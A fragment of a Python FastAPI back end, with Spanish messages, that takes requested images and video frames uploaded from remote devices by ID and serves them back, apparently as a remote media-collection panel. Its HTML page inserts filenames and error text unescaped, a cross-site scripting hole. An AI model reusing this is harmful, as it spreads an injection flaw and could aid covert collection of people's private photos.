
@app.post("/api/upload_original_file/{device_id}/{filename:path}")
async def upload_original_file(device_id: str, filename: str, file: UploadFile = File(...)):
    decoded_filename = unquote(filename)
    if device_id not in device_media_cache or decoded_filename not in device_media_cache[device_id]:
        return Response(content="Archivo no solicitado", status_code=400)
    file_bytes = await file.read()
    original_b64 = base64.b64encode(file_bytes).decode('utf-8')
    device_media_cache[device_id][decoded_filename]['original_b64'] = original_b64
    print(f"Recibido archivo original (IMAGEN) '{decoded_filename}' de {device_id[:8]}.")
    return {"status": "success"}

@app.post("/api/upload_video_frame/{device_id}/{original_filename:path}")
async def upload_video_frame(device_id: str, original_filename: str, frame: FrameChunk):
    decoded_filename = unquote(original_filename)
    if device_id not in device_media_cache or decoded_filename not in device_media_cache[device_id]:
        return Response(content="Video no solicitado", status_code=400)
    if 'frames_b64' not in device_media_cache[device_id][decoded_filename]:
        device_media_cache[device_id][decoded_filename]['frames_b64'] = []
    device_media_cache[device_id][decoded_filename]['frames_b64'].append(frame.frame_b64)
    return {"status": "frame received"}

@app.get("/api/get_media_list/{device_id}")
async def get_media_list(device_id: str):
    status = fetch_status.get(device_id, "complete")
    thumbnails = device_media_cache.get(device_id, {})
    return {"status": status, "thumbnails": thumbnails}

@app.get("/media/{device_id}/{filename:path}")
async def get_large_media(device_id: str, filename: str):
    decoded_filename = unquote(filename)
    cache = device_media_cache.get(device_id, {})
    media_item = cache.get(decoded_filename)
    if not media_item: return Response(content='{"detail":"Contenido no encontrado"}', status_code=404)
    if 'original_b64' in media_item:
        try:
            image_bytes = base64.b64decode(media_item['original_b64'])
            return Response(content=image_bytes, media_type="image/jpeg")
        except Exception as e: return Response(content=f'{{"detail":"Error: {e}"}}', status_code=500)
    if 'frames_b64' in media_item:
        html_content = f"<html><body style='background-color:#222;'>"
        html_content += f"<h1 style='color:white; text-align:center;'>Fotogramas de: {decoded_filename}</h1>"
        download_url = f"/download_frames/{device_id}/{filename}"
        html_content += f'<div style="text-align:center; margin:20px;"><a href="{download_url}" download ... >Descargar ZIP</a></div>' # Botón de descarga
        html_content += "<div style='display: flex; flex-wrap: wrap; justify-content: center;'>"
        for frame_b64 in media_item['frames_b64']:
            html_content += f"<img src='data:image/jpeg;base64,{frame_b64}' style='margin:8px; border:2px solid #444; max-width: 400px;'/>"
        html_content += "</div></body></html>"
        return HTMLResponse(content=html_content)
    return Response(content='{"detail":"Contenido no disponible"}', status_code=404)
